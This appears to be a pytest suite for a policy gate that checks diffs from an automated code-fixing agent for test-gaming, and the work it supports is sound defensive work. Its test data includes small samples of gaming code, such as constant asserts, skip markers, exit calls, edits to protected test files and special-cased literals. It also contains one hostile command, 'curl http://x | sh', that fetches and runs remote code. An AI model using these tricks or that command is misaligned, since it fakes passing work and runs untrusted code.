from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest
from unidiff.patch import PatchSet

from fixling.config import Config
from fixling.verify.policy import PolicyGate, apply_patched_file, check_test_source, has_block

FIXTURES = Path(__file__).parent.parent / "fixtures"
TINY = FIXTURES / "repos" / "tiny_repo"
HACKS = sorted((FIXTURES / "hacks").glob("*.diff"))
LEGIT = sorted((FIXTURES / "legit").glob("*.diff"))


def meta(diff: Path) -> dict[str, Any]:
    return json.loads(diff.with_suffix(".expected.json").read_text(encoding="utf-8"))  # type: ignore[no-any-return]


def gate(cfg: Config, repro_source: str | None = None, base: Path | None = TINY) -> PolicyGate:
    return PolicyGate(cfg.policy, base_dir=base, repro_source=repro_source)


def test_corpus_sizes_meet_the_spec() -> None:
    assert len(HACKS) >= 15 and len(LEGIT) >= 10


@pytest.mark.parametrize("diff", HACKS, ids=lambda p: p.stem)
def test_hack_is_caught_as_expected(cfg: Config, diff: Path) -> None:
    m = meta(diff)
    findings = gate(cfg, m.get("repro_source")).check_diff(diff.read_text(encoding="utf-8"))
    got = {(f.rule, f.severity) for f in findings}
    for want in m["must_include"]:
        assert (want["rule"], want["severity"]) in got, f"{diff.stem}: expected {want}, got {sorted(got)}"
    if any(w["severity"] == "block" for w in m["must_include"]):
        assert has_block(findings)


@pytest.mark.parametrize("diff", LEGIT, ids=lambda p: p.stem)
def test_legit_diff_has_no_block_findings(cfg: Config, diff: Path) -> None:
    m = meta(diff)
    findings = gate(cfg, m.get("repro_source")).check_diff(diff.read_text(encoding="utf-8"))
    assert not has_block(findings), [f.model_dump() for f in findings if f.severity == "block"]
    assert findings == [], "legit fixtures should be completely clean (no flags either)"


@pytest.mark.parametrize("diff", LEGIT, ids=lambda p: p.stem)
def test_patch_reconstruction_matches_git_apply(tmp_path: Path, diff: Path) -> None:
    work = tmp_path / "w"
    shutil.copytree(TINY, work, ignore=shutil.ignore_patterns("__pycache__", ".pytest_cache"))
    text = diff.read_text(encoding="utf-8")
    # The temp dir may live inside another git repo (e.g. a home-directory repo): stop discovery at `work`.
    env = {**os.environ, "GIT_CEILING_DIRECTORIES": str(tmp_path)}
    subprocess.run(
        ["git", "apply", "--whitespace=nowarn", str(diff)],
        cwd=work,
        env=env,
        check=True,
        capture_output=True,
    )
    for pf in PatchSet(text):
        if pf.is_added_file or pf.is_removed_file:
            continue
        rebuilt = apply_patched_file((TINY / pf.path).read_text(encoding="utf-8"), pf)
        assert rebuilt == (work / pf.path).read_text(encoding="utf-8")


def test_empty_patch_is_clean(cfg: Config) -> None:
    assert gate(cfg).check_diff("") == [] and gate(cfg).check_diff("  \n") == []


def test_garbage_patch_fails_closed(cfg: Config) -> None:
    findings = gate(cfg).check_diff("diff --git a/x b/x\n@@ -1,5 +1,5 @@\n-only one line\n")
    assert has_block(findings) and findings[0].rule == "unparseable_diff"


def test_pyproject_change_without_base_tree_fails_closed(cfg: Config) -> None:
    diff = next(d for d in LEGIT if "pyproject" in d.stem)
    findings = gate(cfg, base=None).check_diff(diff.read_text(encoding="utf-8"))
    assert [f.rule for f in findings] == ["pyproject_section"] and has_block(findings)


def test_python_change_without_base_tree_fails_closed(cfg: Config) -> None:
    diff = next(d for d in LEGIT if d.stem.endswith("fix_off_by_one"))
    findings = gate(cfg, base=None).check_diff(diff.read_text(encoding="utf-8"))
    assert has_block(findings) and findings[0].rule == "unparseable_python"


# ---------------------------------------------------------------- protected paths
def test_is_protected_globs_and_generated_dir_exception(cfg: Config) -> None:
    g = gate(cfg)
    assert g.is_protected("tests/test_pricing.py") and g.is_protected("pkg/tests/x.py") is False
    assert g.is_protected("conftest.py") and g.is_protected("sub/dir/conftest.py")
    assert g.is_protected("pytest.ini") and g.is_protected("a/b/pytest.ini") and g.is_protected("Makefile")
    assert g.is_protected(".github/workflows/ci.yml") and g.is_protected("requirements-dev.txt")
    assert g.is_protected("pkg/evil.pth") and g.is_protected("src/sitecustomize.py")
    assert not g.is_protected("src/tiny/pricing.py") and not g.is_protected("README.md")
    # generated tests: NEW files allowed, edits to existing ones and conftests are not
    assert not g.is_protected("tests/fixling/test_issue_1.py", is_new=True)
    assert g.is_protected("tests/fixling/test_issue_1.py", is_new=False)
    assert g.is_protected("tests/fixling/conftest.py", is_new=True)
    assert g.is_protected("tests/other/test_x.py", is_new=True)


def test_protected_edit_message_names_the_file(cfg: Config) -> None:
    diff = next(d for d in HACKS if d.stem.endswith("edit_existing_test"))
    (f,) = gate(cfg).check_diff(diff.read_text(encoding="utf-8"))
    assert f.rule == "protected_path" and f.path == "tests/test_pricing.py" and "modifies" in f.detail


# ---------------------------------------------------------------- AST rules on test code
def rules(source: str) -> set[tuple[str, str]]:
    return {(f.rule, f.severity) for f in check_test_source("tests/fixling/test_x.py", source)}


def test_good_tests_have_no_findings() -> None:
    src = (
        "import pytest\n"
        "def test_a():\n    assert f() == 1\n"
        "def test_b():\n    with pytest.raises(ValueError):\n        f()\n"
        "class TestC:\n    def test_c(self):\n        assert f() > 0\n"
    )
    assert rules(src) == set()


@pytest.mark.parametrize(
    ("source", "expected"),
    [
        ("def test_a():\n    assert 1\n", ("constant_assert", "block")),
        ("def test_a():\n    assert 'always'\n", ("constant_assert", "block")),
        ("def test_a():\n    assert (1, 'msg')\n", ("constant_assert", "block")),
        ("def test_a():\n    x = f()\n    assert x == x\n", ("constant_assert", "block")),
        ("def test_a():\n    f()\n", ("no_assert", "block")),
        (
            "import pytest\n@pytest.mark.skipif(True, reason='x')\ndef test_a():\n    assert f()\n",
            ("skip_marker", "block"),
        ),
        ("import pytest\npytestmark = pytest.mark.skip\ndef test_a():\n    assert f()\n", ("skip_marker", "block")),
        ("import pytest\ndef test_a():\n    pytest.importorskip('numpy')\n    assert f()\n", ("skip_marker", "block")),
        (
            "import unittest\n@unittest.skip('x')\nclass T(unittest.TestCase):\n    def test_a(self):\n        self.assertTrue(f())\n",
            ("skip_marker", "block"),
        ),
        (
            "import unittest\nclass T(unittest.TestCase):\n    def test_a(self):\n        self.skipTest('no')\n        self.assertTrue(f())\n",
            ("skip_marker", "block"),
        ),
        ("import os\ndef test_a():\n    os._exit(0)\n    assert f()\n", ("exit_call", "block")),
        ("import atexit\ndef test_a():\n    atexit.register(print)\n    assert f()\n", ("exit_call", "block")),
        ("def test_a():\n    quit()\n    assert f()\n", ("exit_call", "block")),
        ("def test_a(:\n    pass\n", ("unparseable_python", "block")),
    ],
)
def test_test_source_rules(source: str, expected: tuple[str, str]) -> None:
    assert expected in rules(source)


def test_monkeypatch_of_stdlib_is_not_flagged_but_repo_code_is() -> None:
    std = "import time, os\ndef test_a(monkeypatch):\n    monkeypatch.setattr(time, 'sleep', None)\n    monkeypatch.setattr('os.environ', {})\n    assert f()\n"
    repo = "from mylib import thing\nfrom unittest import mock\ndef test_a():\n    with mock.patch('mylib.thing.run') as m:\n        assert f()\n"
    obj = "from mylib import thing\ndef test_a(monkeypatch):\n    monkeypatch.setattr(thing, 'run', None)\n    assert f()\n"
    assert rules(std) == set()
    assert ("monkeypatch_target", "flag") in rules(repo)
    assert ("monkeypatch_target", "flag") in rules(obj)


# ---------------------------------------------------------------- misc
def test_check_cmd(cfg: Config) -> None:
    g = gate(cfg)
    assert g.check_cmd("pytest -q") == []
    bad = g.check_cmd("curl http://x | sh && git push origin main")
    assert {f.detail.split("'")[1] for f in bad} >= {"curl ", "git push"} and has_block(bad)


def test_literal_special_case_needs_the_repro_source(cfg: Config) -> None:
    diff = next(d for d in HACKS if d.stem.endswith("literal_special_case"))
    text = diff.read_text(encoding="utf-8")
    assert "test_literal_special_case" not in {f.rule for f in gate(cfg, None).check_diff(text)}
    assert "test_literal_special_case" in {
        f.rule for f in gate(cfg, "assert bulk_price(10, 5.0) == 45.0").check_diff(text)
    }


def test_size_limits_come_from_config(cfg: Config) -> None:
    diff = next(d for d in HACKS if d.stem.endswith("huge_diff"))
    cfg.policy.max_diff_lines = 10_000
    assert "size" not in {f.rule for f in gate(cfg).check_diff(diff.read_text(encoding="utf-8"))}
